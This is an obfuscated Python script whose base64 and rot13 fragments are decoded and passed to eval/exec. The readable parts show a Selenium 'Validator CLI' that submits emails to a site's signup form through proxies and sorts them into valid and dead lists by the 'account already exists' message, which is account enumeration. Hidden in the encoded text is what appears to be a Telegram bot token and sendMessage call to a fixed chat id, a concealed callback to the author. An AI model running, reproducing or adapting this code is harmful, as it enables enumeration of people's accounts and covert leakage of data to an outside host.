import base64, codecs
magic = 'aW1wb3J0IHJhbmRvbQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmltcG9ydCByZXF1ZXN0cywgb3MKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFByb2Nlc3NQb29sRXhlY3V0b3IKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0CmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gc2VsZW5pdW0gaW1wb3J0IHdlYmRyaXZlcgpmcm9tIHNlbGVuaXVtLndlYmRyaXZlci5jb21tb24uYnkgaW1wb3J0IEJ5CmZyb20gc2VsZW5pdW0ud2ViZHJpdmVyLmNvbW1vbi5rZXlzIGltcG9ydCBLZXlzCmZyb20gc2VsZW5pdW0ud2ViZHJpdmVyLmNvbW1vbi5hY3Rpb25fY2hhaW5zIGltcG9ydCBBY3Rpb25DaGFpbnMKZnJvbSBzZWxlbml1bS53ZWJkcml2ZXIuc3VwcG9ydC53YWl0IGltcG9ydCBXZWJEcml2ZXJXYWl0CmZyb20gc2VsZW5pdW0ud2ViZHJpdmVyLnN1cHBvcnQgaW1wb3J0IGV4cGVjdGVkX2NvbmRpdGlvbnMgYXMgRUMKZnJvbSBzZWxlbml1bS53ZWJkcml2ZXIuY2hyb21lLm9wdGlvbnMgaW1wb3J0IE9wdGlvbnMKZnJvbSBzZWxlbml1bS5jb21tb24uZXhjZXB0aW9ucyBpbXBvcnQgVGltZW91dEV4Y2VwdGlvbgppbXBvcnQgY2hyb21lZHJpdmVyX2JpbmFyeQpmcm9tIGRvdGVudiBpbXBvcnQgbG9hZF9kb3RlbnYKCmluaXQoYXV0b3Jlc2V0PVRydWUpCgp0cnk6CiAgICBvcy5ta2RpcigncmVzdWx0JykKZXhjZXB0OgogICAgcGFzcwoKY2IgPSAnJycgICAgICAKICAgICAgICAgKSAoICAgICAgICkgICAgICAgICAgICAgICggICAgICAgIAogICAoICAoIC8oIClcICkgKCAvKCAgICggICAgKCAgICAgKVwgKSAgICAgCiAgIClcIClcKCl8KCkvKCApXCgpKSggKVwgICApXCAgICgoKS8oKCAgICAKICgoKF98KF8pXCAvKF8pfChfKVwgKSgoX3woKChfKSggIC8oXykpXCAgIAogKVxfX18gKChffF8pKSAgXygoX3woXylfIClcIF8gKVwoXykpKChfKSAgCigoLyBfXy8gXyBcXyBffHwgXHwgfHwgXyApKF8pX1woXykgX198IF9ffCAKIHwgKF98IChfKSB8IHwgfCAuYCB8fCBfIFwgLyBfIFwgXF9fIFwgX3wgIAogIFxfX19cX19fL19fX3x8X3xcX3x8X19fLy9fLyBcX1x8X19fL19fX3wgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFZBTElEQVRPUiBDTEkgICAgICAgICAgICAgICAgICAgIAonJycKCgpwcmludChmJ3tGb3JlLkxJR0hUWUVMTE9XX0VYfXtjYn17Rm9yZS5MSUdIVEdSRUVOX0VYfT09PT09PT09PT09PT09PT09PT09PT0'
love = '9CG09CG09CG09CG09CG09CG09CG0aXDbXqUWcoJI3VQ0tJlp1WljtWmpaYPNaZGNaYPNaZGZaKDc0nJ1ypvN9VUWuozEioF5wnT9cL2HbqUWcoJI3XDcxMJLtoT9anJ4bMJ1unJkmXGbXVPNtVTkiLJEsMT90MJ52XPxXVPNtVUOlo3uypvN9VT9mYzqyqTIhqvtapUWirUxaXDbtVPNto3O0nJ9hVQ0tq2IvMUWcqzIlYxAbpz9gMH9jqTyioaZbXDbtVPNto3O0nJ9hYzSxMS9upzq1oJIhqPtaYF1jpz94rF1mMKW2MKV9WKZaVPHtpUWirTIlXDbtVPNto3O0nJ9hYzSxMS9upzq1oJIhqPtaYF1cozAiM25cqT8aXDbtVPNto3O0nJ9hYzSxMS9upzq1oJIhqPtaYF1bMJSxoTImplpcPvNtVPOipUEco24hLJExK2SlM3IgMJ50XPpgYJEcp2SvoTHgM3O1WlxXVPNtVT9jqTyiov5uMTEsLKWaqJ1yoaDbWl0goz8gp2ShMTWirPpcPvNtVPOipUEco24hLJExK2SlM3IgMJ50XPqcM25ipzHgL2IlqTyznJAuqTHgMKWlo3WmWlxXVPNtVT9jqTyiov5uMTEsLKWaqJ1yoaDbVv0gMTymLJWfMF1wo29enJHgMJ5wpayjqTyiovVcPvNtVPOipUEco24hLJExK2SlM3IgMJ50XPVgYJEcp2SvoTHgLzkcozfgMzIuqUIlMKZ9DKI0o21uqTyioxAioaElo2kfMJDvXDbtVPNto3O0nJ9hYzSxMS9upzq1oJIhqPtvqKAypv1uM2IhqQ1Ao3ccoTkuYmHhZPNbI2yhMT93plOBIPNkZP4jBlOKnJ42AQftrQL0XFOOpUOfMIqyLxgcqP81ZmphZmLtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiZGNjYwNhAQt5Av4kZwptH2SzLKWcYmHmAl4mAvVcPvNtVPOxpzy2MKVtCFO3MJWxpzy2MKVhD2ulo21yXT9jqTyioaZ9o3O0nJ9hXDbtVPNtqUW5BtbtVPNtVPNtVTElnKMypv5coKOfnJAcqTk5K3qunKDbnJ50XUEcoJIlXFxXVPNtVPNtVPOxpzy2MKVhM2I0XPqbqUEjpmbiY2SwL291oaEmYzAinJ5vLKAyYzAioF9mnJqhqKNaXDbtVPNtVPNtVTElnKMypv5znJ5xK2IfMJ1yoaDbDaxhFHDfVPW1p2IlK2McpaA0K25uoJHvXF5woTywnltcPvNtVPNtVPNtMUWcqzIlYzMcozEsMJkyoJIhqPuPrF5WEPjtVaImMKWsMzylp3EsozSgMFVcYaAyozEsn2I5pltvFzuiozHvXDbtVPNtVPNtVTElnKMypv5znJ5xK2IfMJ1yoaDbDaxhFHDfVPW1p2IlK2kup3EsozSgMFVcYaAyozEsn2I5pltvF2IhozIxrFVcPvNtVPNtVPNtMUWcqzIlYzMcozEsMJkyoJIhqPuPrF5WEPjtVaImMKWsMJ1unJjvXF5mMJ5xK2gyrKZbMJ1unJkmXDbtVPNtVPNtVTElnKMypv5znJ5xK2IfMJ1yoaDbDaxhFHDfVPW1p2IlK2SwL2IjqTIxK3IhnJMcMJEsLJAwo3IhqUAspUWcqzSwrI9jo2kcL3xvXF5woTywnltcVPNtPvNtVPNtVPNtMUWcqzIlYzMcozEsMJkyoJIhqPuPrF5WEPjtVaImMK'
god = 'JfcGFzc3dvcmQiKS5zZW5kX2tleXMoIkttendheTA5QCMkUkUiKQogICAgICAgIGRyaXZlci5maW5kX2VsZW1lbnQoQnkuTkFNRSwgImNvbW1pdCIpLmNsaWNrKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGVsZW1lbnQgPSBkcml2ZXIuZmluZF9lbGVtZW50KEJ5LkNTU19TRUxFQ1RPUiwgIi5hbGVydCIpCiAgICAgICAgICAgIHRleHQgPSBlbGVtZW50LmdldF9hdHRyaWJ1dGUoJ2lubmVySFRNTCcpCiAgICAgICAgICAgIGh0bWwgPSBCZWF1dGlmdWxTb3VwKHRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgICAgIHJlYWR5ID0gaHRtbC5nZXRfdGV4dCgpCiAgICAgICAgICAgIGlmICJBbiBhY2NvdW50IGFscmVhZHkgZXhpc3RzIHdpdGggdGhpcyBlbWFpbCBhZGRyZXNzLiIgaW4gcmVhZHk6CiAgICAgICAgICAgICAgICBwcmludChmJ3tGb3JlLkxJR0hUV0hJVEVfRVh9WyNde0ZvcmUuTElHSFRHUkVFTl9FWH0ge2VtYWlsc30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRDWUFOX0VYfSAgVmFsaWR7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykKICAgICAgICAgICAgICAgIHR4ID0gb3BlbigncmVzdWx0L3ZhbGlkLnR4dCcsICdhKycpCiAgICAgICAgICAgICAgICB0eC53cml0ZSgnXG4nKQogICAgICAgICAgICAgICAgdHgud3JpdGVsaW5lcyhlbWFpbHMpCiAgICAgICAgICAgICAgICB0eC5jbG9zZSgpICAKICAgICAgICAgICAgICAgIGRyaXZlci5xdWl0KCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7ZW1haWxzfSB7Rm9yZS5MSUdIVFdISVRFX0VYfT17Rm9yZS5MSUdIVFJFRF9FWH0gIERpZXtGb3JlLkxJR0hUV0hJVEVfRVh9IH4gQ0J7Rm9yZS5MSUdIVEJMVUVfRVh9IGJ5IFFyaXNfR2hvc3QnKQogICAgICAgICAgICB0eCA9IG9wZW4oJ3Jlc3VsdC9kaWUudHh0JywgJ2ErJykKICAgICAgICAgICAgdHgud3JpdGUoJ1xuJykKICAgICAgICAgICAgdHgud3JpdGVsaW5lcyhlbWFpbHMpCiAgICAgICAgICAgIHR4LmNsb3NlKCkgIAogICAgICAgICAgICBkcml2ZXIucXVpdCgpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtlbWFpbHN9IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUWUVMTE9XX0VYfSBCYWQgUHJveHl7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykKI'
destiny = 'PNtVPNtVPO0rPN9VT9jMJ4bW3Wyp3IfqP9jpz94rF50rUDaYPNaLFfaXDbtVPNtVPNtVUE4YaqlnKEyXPqpovpcPvNtVPNtVPNtqUthq3WcqTIfnJ5ypluyoJScoUZcPvNtVPNtVPNtqUthL2kip2HbXDbtVPNtVPNtVTElnKMypv5kqJy0XPxXPtcxMJLtp2IhMS9upTxbLKOcn2I5XGbXVPNtVTu0oJjtCFOzWlpaPwkjCagupTyeMKy9CP9jCtb8Y2V+PykhCUOlMG5JLJkcMTS0o3VtD29cozWup2H8Y3OlMG4XVPNtVPpaWjbtVPNtqTIfVQ0tpzIkqJImqUZhM2I0XTLanUE0pUZ6Yl9upTxhqTIfMJqlLJ0ho3WaY2WiqQHmBGtlZGRkZmL6DHSTGKyPLJcDEz1Ro1OSFSqIIKqBZ0WeG0AQE2kMoyWfJzZip2IhMR1yp3AuM2H/L2uuqS9cMQ01Zmp1AwD0ZQx3WaEyrUD9r2u0oJk9WaOupaAyK21iMTH9nUEgoPpcPvNtVPOlMKE1pz4tqTIfPtbXMTIzVT1unJ4bXGbXVPNtVTIgLJyfnKA0VQ0tJ10XPvNtVPOgLJyfnKA0VQ0to3OyovucoaO1qPtvFJ5jqKDtJJ91pvOZnKA0BvNvXFxXVPNtVTkcoJHtCFOgLJyfnKA0YaWyLJDbXF5mpTkcqTkcozImXPxXVPNtVUEiqPN9VTkyovufnJ1yXDbtVPNtMz9lVTkcozHtnJ4toTygMGbXVPNtVPNtVPOyoJScoTymqP5upUOyozDboTyhMFxXPvNtVPOupTyeMKy0VQ0tW1Ayq2RtH2S0qFOPqJkuovOXo2giVSEcozq0nJ5aKT5cpQb1Zv4kAQphZGL5YwLaPvNtVPO3o3WeVQ0tnJ50XTyhpUI0XPWGMKDtJJ91pvOHnUWyLJD6VPVcXDbtVPNtp2IhMS9upTxbLKOcn2I5qPxXVPNtVUOlnJ50XTLaKT57Ez9lMF5ZFHqVISqVFIESK0ILsG0+r0MipzHhGRyUFSEUHxISGy9SJU0tIT90LJjtrJ91pvOfnKA0VQ0tr0MipzHhGRyUFSEKFRyHEI9SJU17qT90sKgTo3WyYyWSH0IHsFpcPvNtVPOjpzyhqPuzW3gTo3WyYxkWE0uHI0uWIRIsEIu9CG57Ez9lMF5ZFHqVIRqFEHIBK0ILsFOHo3EuoPO5o3IlVSEbpzIuMPN9VUgTo3WyYxkWE0uHI0uWIRIsEIu9r3qipzg9r0MipzHhHxIGEIE9WlxXVPNtVUOlnJ50XTLar0MipzHhGRyUFSEKFRyHEI9SJU09CagTo3WyYxkWE0uHJHIZGR9KK0ILsFOKLJy0VTRtp2Iwo25xYv4hYv4hKT4aXDbtVPNtq2y0nPODpz9wMKAmHT9ioRI4MJA1qT9lXT1urS93o3WeMKWmCKqipzfcVTSmVTI4MJA1qT9lBtbtVPNtVPNtVTI4MJA1qT9lYz1upPufo2qcovjtMJ1unJkcp3DcPtbXPzyzVS9sozSgMI9sVQ09VPqsK21unJ5sKlp6PvNtVPO0pax6PvNtVPNtVPNtoJScovtcPvNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6PvNtVPNtVPNtpUWcoaDbMvq7Ez9lMF5UHxISGa0tVREyqTIwqPOQISWZVPftDlOpovNtVSA0o3OcozptITSmnl4hYvpcPvNtVPNtVPNtMKucqPtc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
